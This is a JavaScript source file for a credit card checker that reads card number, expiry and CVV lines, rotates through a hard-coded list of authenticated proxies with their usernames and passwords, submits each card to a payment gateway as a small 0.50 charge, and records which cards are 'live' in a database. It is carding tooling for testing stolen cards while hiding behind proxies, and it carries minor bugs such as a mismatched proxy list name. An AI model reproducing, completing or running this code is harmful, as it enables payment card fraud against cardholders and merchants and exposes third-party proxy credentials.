const axios = require('axios');

// ================== PROXY CYCLE ==================
proxies_list = [
    "http://akifdemi55574:llfg52end4@192.158.235.162:21250",
    "http://akifdemi55574:llfg52end4@160.202.94.136:21323",
    "http://akifdemi55574:llfg52end4@104.143.228.9:21320",
    "http://akifdemi55574:llfg52end4@179.61.252.53:21308",
    "http://akifdemi55574:llfg52end4@191.96.30.51:21276"
]
let proxyIndex = 0;

function nextProxy() {
    const proxy = proxyList[proxyIndex];
    proxyIndex = (proxyIndex + 1) % proxyList.length;
    return proxy;
}

// ================== MAIN FUNCTION ==================
async function fullCheckCard(card) {
    const proxy = nextProxy();
    const cc = card.trim().split("|");

    if (cc.length < 4) {
        return { error: "Format hatalı" };
    }

    const [number, month, year, cvv] = cc;
    // const binInfo = await getBinInfo(number);

    const headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Content-Type": "application/x-www-form-urlencoded"
    };

    const payload = {
        card_number: number,
        card_exp_month: month,
        card_exp_year: year,
        card_cvv: cvv,
        amount: "0.50"
    };

    let isLive = false;
    let balance = "0.00";

        for (let attempt = 0; attempt < 2; attempt++) {
            try {
                const response = await axios.post(
                    "https://secure.payadultgateway.com/transaction",
                    payload,
                    {
                        headers,
                        proxy: {
                            protocol: "http",
                            host: new URL(proxy).hostname,
                            port: parseInt(new URL(proxy).port),
                            auth: new URL(proxy).username ? {
                                username: new URL(proxy).username,
                                password: new URL(proxy).password
                            } : undefined
                        },
                        timeout: 15000
                    }
                );

                const balMatch = response.data.match(/(\d+\.?\d*)/);
                if (balMatch) {
                    balance = balMatch[1];
                    isLive = true;
                    break;
                }
            } catch (error) {
                console.log(`Attempt ${attempt + 1} failed, retrying...`);
                await new Promise(r => setTimeout(r, 2000));
            }
        }

    const status = isLive ? 1 : 0;

    const result = {
        card: card,
        // bin: binInfo.bin,
        // brand: binInfo.brand,
        // type: binInfo.type,
        // level: binInfo.level,
        // bank: binInfo.bank,
        // country: binInfo.country,
        // country_name: binInfo.country_name,
        live: isLive,
        balance: balance,
        status: status
    };

    await saveToMongoDB(result);
    return result;
}

module.exports = { fullCheckCard };
